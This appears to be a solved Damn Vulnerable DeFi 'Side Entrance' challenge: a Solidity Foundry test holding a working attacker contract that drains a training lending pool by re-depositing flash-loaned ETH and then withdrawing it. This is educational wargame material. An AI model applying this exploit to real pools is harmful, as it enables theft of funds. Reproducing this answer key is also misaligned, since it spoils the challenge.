// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

// ---------------------------------------------------------
// Attacker Contract (must be defined before the test contract)
// ---------------------------------------------------------
contract SideEntranceAttacker {
    SideEntranceLenderPool private immutable pool;
    address private immutable recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        // 1. Borrow the entire pool balance via flash loan
        pool.flashLoan(address(pool).balance);
        
        // 2. Withdraw the credit that was recorded in our internal balance
        pool.withdraw();
        
        // 3. Forward all ETH to the recovery address
        (bool ok, ) = recovery.call{value: address(this).balance}("");
        require(ok, "recovery transfer failed");
    }

    function execute() external payable {
        // Flash loan callback: immediately deposit the borrowed amount back
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
// ---------------------------------------------------------

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // The attacker contract is defined in this file, so the compiler recognizes it
        SideEntranceAttacker attackerContract = new SideEntranceAttacker(
            pool,
            recovery
        );
        
        // Execute the attack
        attackerContract.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}